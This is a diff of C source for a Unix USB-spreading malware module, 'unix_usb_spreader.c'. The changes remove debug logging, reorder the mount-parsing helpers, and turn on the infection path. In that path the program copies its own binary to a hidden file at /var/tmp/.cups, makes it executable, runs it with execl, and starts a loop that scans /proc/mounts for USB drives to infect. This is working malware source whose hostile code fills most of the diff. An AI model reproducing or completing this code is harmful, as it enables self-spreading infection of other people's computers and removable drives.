@@ -1,14 +1,9 @@
 #include "unix_usb_spreader.h"
-#include "mount_info.h"
-#include "mount_info_node.h"
-#include "files.h"
-#include "string_utils.h"
+
 #include <stdlib.h>
 #include <stdio.h>
 #include <stdbool.h>
 #include <dirent.h>
-#include "files.h"
-#include "string_utils.h"
 #include <string.h>
 #include <unistd.h>
 #include <sys/stat.h>
@@ -136,19 +131,15 @@ char *readVirtualFile(const char *filename) {
 }
 
 char *readBinaryFile(const char* filename, size_t *fileSize) {
-    DEBUG_LOG("aqui1, but con print path: %s\n", filename);
-
     FILE * f = global->fopen(filename, "rb");
     if (f == NULL) {
         DEBUG_LOG_ERR("[USB] fail to open the binary file\n");
         return NULL;
     }
-    DEBUG_LOG("aqui11\n");
 
     global->fseek(f, 0, SEEK_END);
     *fileSize = global->ftell(f);
     global->rewind(f);
-    DEBUG_LOG("aqui12\n");
 
     char* content = (char *)global->malloc(*fileSize + 1);
     if (content == NULL) {
@@ -157,7 +148,6 @@ char *readBinaryFile(const char* filename, size_t *fileSize) {
         global->fclose(f);
         return NULL;
     }
-    DEBUG_LOG("aqui13\n");
 
     size_t readBytes = global->fread(content, 1, *fileSize, f);
     if (readBytes != *fileSize) {
@@ -166,7 +156,6 @@ char *readBinaryFile(const char* filename, size_t *fileSize) {
         global->fclose(f);
         return NULL;
     }
-    DEBUG_LOG("aqui14\n");
 
     content[readBytes] = '\0';
 
@@ -400,96 +389,6 @@ int compareDeviceLists(char old_devices[][256], int old_count, char new_devices[
 }
 
 //######END files.c#####
-//######START mount_info.c#####
-
-bool isUSBMount(char* devPath, char* mountPath) {
-    char* pathToMatch = "/dev/sd";
-
-    char *whereIsIt = findSubstring(devPath, pathToMatch);
-    if (whereIsIt != NULL && devPath == whereIsIt) {
-        //contains pathToMatch, and it's at the beginning
-
-        char rootDir[2] = "/";
-        char homeDir[6] = "/home";
-        char *isHomeDir = findSubstring(mountPath, homeDir);
-        if(global->strncmp(mountPath, rootDir, sizeof(rootDir)) == 0 || isHomeDir != NULL) {
-            return false;
-        }
-        return true;
-    }
-    
-    return false;
-}
-
-Mounts* parseMountLine(char* line) {
-    Mounts* mountInfo = (Mounts *) global->malloc(sizeof(Mounts));
-    int i = 0;
-    char* rawMountLineInfo = global->strtok(line, " ");
-    while (rawMountLineInfo != NULL) {
-        i++;
-        switch (i) {
-        case 1:
-            global->strncpy(mountInfo->device, rawMountLineInfo, sizeof(mountInfo->device)); //for now ignore if atoi return 0
-            break;
-        case 2:
-            global->strncpy(mountInfo->mountPoint, rawMountLineInfo, sizeof(mountInfo->mountPoint));
-            break;
-        case 3:
-            global->strncpy(mountInfo->fsType, rawMountLineInfo, sizeof(mountInfo->fsType));
-            break;
-        case 4:
-            global->strncpy(mountInfo->permissions, rawMountLineInfo, sizeof(mountInfo->permissions));
-            break;
-        case 5:
-            mountInfo->dummy1 = global->atoi(rawMountLineInfo);
-            break;
-        case 6:
-            mountInfo->dummy2 = global->atoi(rawMountLineInfo);
-            break;
-        }
-        rawMountLineInfo = global->strtok(NULL, " ");
-    }
-    
-    return mountInfo;
-}
-
-Mounts* parseMountsFile(size_t *arrSize) {
-    char *procMountPath = "/proc/mounts";
-    if (!fileExists(procMountPath)) {
-        procMountPath = "/etc/mtab";
-    }
-
-    while (isSymLink(procMountPath)){
-        char *resolvedProcMountPath = procMountPath;
-        procMountPath = followSymLink(resolvedProcMountPath);
-    }
-
-    char* fileContent = readVirtualFile(procMountPath);
-    if (!fileContent) {
-        DEBUG_LOG_ERR("[USB] fail to read virtual file\n");
-        return NULL;
-    }
-
-    char *lineCtx;
-    char* line = global->__strtok_r(fileContent, "\n", &lineCtx);
-    Node *headSysMounts = NULL;
-    Node *tailSysMounts = NULL;
-    while (line != NULL) {
-        Mounts *mountInfo = parseMountLine(line);
-        if (mountInfo == NULL) {
-            DEBUG_LOG_ERR("[USB] invalid mount line parsed, should not happen\n");
-        } else {
-            appendNode(&headSysMounts, &tailSysMounts, *mountInfo);
-        }
-        line = global->__strtok_r(NULL, "\n", &lineCtx);
-    }
-
-    Mounts* mounts = listToArr(headSysMounts, tailSysMounts, arrSize);
-    
-    return mounts;
-}
-
-//#####END mount_info.c#####
 //#####START mount_info_node.c#####
 
 Node *createNode(Mounts info) {
@@ -588,48 +487,126 @@ Mounts* listToArr(Node* head, Node* tail, size_t *countArr) {
 }
 
 //#####END mount_info_node.c#####
+//######START mount_info.c#####
+
+bool isUSBMount(char* devPath, char* mountPath) {
+    char* pathToMatch = "/dev/sd";
+
+    char *whereIsIt = findSubstring(devPath, pathToMatch);
+    if (whereIsIt != NULL && devPath == whereIsIt) {
+        //contains pathToMatch, and it's at the beginning
+
+        char rootDir[2] = "/";
+        char homeDir[6] = "/home";
+        char *isHomeDir = findSubstring(mountPath, homeDir);
+        if(global->strncmp(mountPath, rootDir, sizeof(rootDir)) == 0 || isHomeDir != NULL) {
+            return false;
+        }
+        return true;
+    }
+    
+    return false;
+}
+
+Mounts* parseMountLine(char* line) {
+    Mounts* mountInfo = (Mounts *) global->malloc(sizeof(Mounts));
+    int i = 0;
+    char* rawMountLineInfo = global->strtok(line, " ");
+    while (rawMountLineInfo != NULL) {
+        i++;
+        switch (i) {
+        case 1:
+            global->strncpy(mountInfo->device, rawMountLineInfo, sizeof(mountInfo->device)); //for now ignore if atoi return 0
+            break;
+        case 2:
+            global->strncpy(mountInfo->mountPoint, rawMountLineInfo, sizeof(mountInfo->mountPoint));
+            break;
+        case 3:
+            global->strncpy(mountInfo->fsType, rawMountLineInfo, sizeof(mountInfo->fsType));
+            break;
+        case 4:
+            global->strncpy(mountInfo->permissions, rawMountLineInfo, sizeof(mountInfo->permissions));
+            break;
+        case 5:
+            mountInfo->dummy1 = global->atoi(rawMountLineInfo);
+            break;
+        case 6:
+            mountInfo->dummy2 = global->atoi(rawMountLineInfo);
+            break;
+        }
+        rawMountLineInfo = global->strtok(NULL, " ");
+    }
+    
+    return mountInfo;
+}
+
+Mounts* parseMountsFile(size_t *arrSize) {
+    char *procMountPath = "/proc/mounts";
+    if (!fileExists(procMountPath)) {
+        procMountPath = "/etc/mtab";
+    }
+
+    while (isSymLink(procMountPath)){
+        char *resolvedProcMountPath = procMountPath;
+        procMountPath = followSymLink(resolvedProcMountPath);
+    }
+
+    char* fileContent = readVirtualFile(procMountPath);
+    if (!fileContent) {
+        DEBUG_LOG_ERR("[USB] fail to read virtual file\n");
+        return NULL;
+    }
+
+    char *lineCtx;
+    char* line = global->__strtok_r(fileContent, "\n", &lineCtx);
+    Node *headSysMounts = NULL;
+    Node *tailSysMounts = NULL;
+    while (line != NULL) {
+        Mounts *mountInfo = parseMountLine(line);
+        if (mountInfo == NULL) {
+            DEBUG_LOG_ERR("[USB] invalid mount line parsed, should not happen\n");
+        } else {
+            appendNode(&headSysMounts, &tailSysMounts, *mountInfo);
+        }
+        line = global->__strtok_r(NULL, "\n", &lineCtx);
+    }
+
+    Mounts* mounts = listToArr(headSysMounts, tailSysMounts, arrSize);
+    
+    return mounts;
+}
+
+//#####END mount_info.c#####
 
 // From here starts the main file, unix_usb_spreader.c
 
 bool isFromMalwarePath(char *argZero) {
-    DEBUG_LOG("entered isFromMalwarePath\n");
     return global->strncmp(EXECUTABLE_SYSPATH, argZero, global->strlen(EXECUTABLE_SYSPATH)) == 0;
 }
 
 
 int copyToMwareSysPath(char *currentMalwarePath) {
-    // implementation to copy (write file?)
-    DEBUG_LOG("aqui1\n");
-
     size_t malwareFileSize;
-    DEBUG_LOG("aqui, estoy cansado jefe. path malware: %s\n", currentMalwarePath);
 
-    //char *rawMalwareContent = readfile("hola");
     char *rawMalwareContent = readBinaryFile(currentMalwarePath, &malwareFileSize);
     if (rawMalwareContent == NULL) {
         DEBUG_LOG_ERR("[USB] unable to read self exec binary\n");
         return -1;
     }
 
-    DEBUG_LOG("aqui2\n");
-
     int statusCode = writeBinaryFile(rawMalwareContent, "/var/tmp", ".cups", malwareFileSize);
     if (statusCode != 0) {
         DEBUG_LOG_ERR("[USB] unable to copy malware to system path\n");
         return statusCode;
     }
-    DEBUG_LOG("aqui3\n");
-
 
     // Ensure the copied file is executable
     if (global->chmod("/var/tmp/.cups", 0755) < 0) {
         DEBUG_LOG_ERR("[USB] fail to chmod malware in syspath\n");
         return -1;
     }
-    DEBUG_LOG("aqui4\n");
 
-    //statusCode = global->execl(EXECUTABLE_SYSPATH, EXECUTABLE_SYSPATH, NULL);
-    return statusCode;
+    return 0;
 }
 
 int spreadUSBs(const char* malwareFileName) {
@@ -729,20 +706,22 @@ int startUSBInfector(char *argZero) {
 int usb_spread_module(Globals * glob) {
     global = glob;
 
-    DEBUG_LOG("debug - before first init glob\n");
-
     int statusCode = 0;
     char *executedFromFilename = global->malware_path;
 
     if (isFromMalwarePath(executedFromFilename)) {
-    //if (1) {
         DEBUG_LOG("[USB] Starting infect loop\n");
-        //statusCode = startUSBInfector(executedFromFilename);
+        statusCode = startUSBInfector(executedFromFilename);
     } else {
-        DEBUG_LOG("[USB] Copying malware to system path and running it...\n");
+        DEBUG_LOG("[USB] WARNING, Copying malware to system path and running it, BUT FROM THE USB MODULE. THIS SHOULD NOT HAPPEN...\n");
         statusCode = copyToMwareSysPath(executedFromFilename);
         if (statusCode != 0) {
             DEBUG_LOG_ERR("[USB] fail to copy malware to system path\n");
+        }
+
+        statusCode = global->execl(EXECUTABLE_SYSPATH, EXECUTABLE_SYSPATH, NULL);
+        if (statusCode != 0) {
+            DEBUG_LOG_ERR("[USB] fail to execute binary in EXECUTABLE PATH\n");
         }
     }
 
